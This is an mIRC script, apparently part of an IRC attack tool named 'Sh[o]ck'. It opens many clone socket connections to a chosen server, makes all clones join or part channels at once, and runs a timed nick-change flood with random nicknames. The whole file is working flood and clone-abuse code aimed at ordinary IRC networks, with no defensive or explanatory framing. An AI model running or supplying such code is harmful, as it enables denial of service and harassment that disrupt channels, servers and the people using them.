startclones {
  sockclose raw*
  window -e  @Sock-clones 120 150 560 250 $mircdirsock-popups.txt
  window @clones
  aline @Sock-clones 14*** %ss Loading $1 clones on $2 $+ : $+ $3 $+  %ss ***
  if ($4 == -b) { set %bogus 0,0 }
  if ($4 != -b) { unset %bogus }
  if ($4 == $null) { unset %bogus }
  unset %rawopened
  unset %raw
  unset %clones
  unset %nnick
  unset %data
  :makeclones
  if (%raw == $1) { halt }
  inc %raw
  sockopen raw $+ %raw $2 $3
  goto makeclones
} 
addclones {
  aline @Sock-clones 14*** %ss Loading $1 additional clones on $2 $+ : $+ $3 $+  %ss ***
  if ($4 == -b) { set %bogus 0,0 }
  if ($4 != -b) { unset %bogus }
  if ($4 == $null) { unset %bogus }
  unset %count
  :makeclones
  if (%count == $1) { halt }
  inc %raw
  inc %count
  sockopen raw $+ %raw $2 $3
  goto makeclones
} 
killclones {
  aline @Sock-clones 14*** %ss Killing clones %ss ***
  sockwrite -n raw* quit : $+ %ss  Sh[o]ck %version $+ +mIRC's sockets  %ss
  unset %raw
}
joinall {
  if ($1 == $null) { echo -a * %ss 2JOINALL USAGE: /joinall <chan> <key> | halt } 
  aline @Sock-clones %ss All clones joining $1
  sockwrite  -n raw* join $1 $2
}
partall {
  if ($1 == $null) { echo -a * %ss 2PARTALL USAGE: /partall <chan> <part msg> | halt } 
  aline @Sock-clones %ss All clones parting $$1
  if ($2 == $null) { set %pcmsg :2 $+ %ss Sh[o]ck %version $+ %ss }
  else { set %pcmsg : $+ %ss $2 %ss }
  sockwrite -n raw* part $$1 %pcmsg
}
nickflood {
  if ($1 == $null) { set %nnflood 3 }
  else { set %nnflood $1 }
  if ($2 == $null) { set %nflooddel 1 }
  else { set %nflooddel $2 }
  aline @Sock-clones %ss 12Starting 2NICK FLOOD12 $$1 2changes every12 $$2 2seconds   
  .timer333 %nnflood %nflooddel nflood
}
nflood { 
  unset %nchnick
  :changes
  inc %nchnick
  set %rawsocket raw $+ %nchnick
  if ($sock(%rawsocket).status == $null) { goto changes }
  sockwrite -n raw $+ %nchnick nick $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ ` $+ $r(1,9)
  if (%nchnick >= %rawopened) { halt }
  goto changes
}
